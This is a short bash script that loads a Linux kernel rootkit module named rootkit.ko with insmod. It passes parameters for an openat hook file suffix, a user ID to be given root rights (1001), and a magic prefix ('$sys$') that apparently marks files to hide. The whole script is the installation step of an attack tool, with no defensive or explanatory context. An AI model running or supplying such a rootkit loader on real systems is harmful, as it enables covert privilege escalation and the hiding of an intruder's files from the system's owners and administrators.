#!/bin/bash

# Specify the extension suffix for the openat hook code
SUFFIX=.txt
ROOT_UID=1001
MAGIC_PREFIX='$sys$'
#Insert the rootkit module, providing some parameters
insmod rootkit.ko suffix=$SUFFIX root_uid=$ROOT_UID magic_prefix=$MAGIC_PREFIX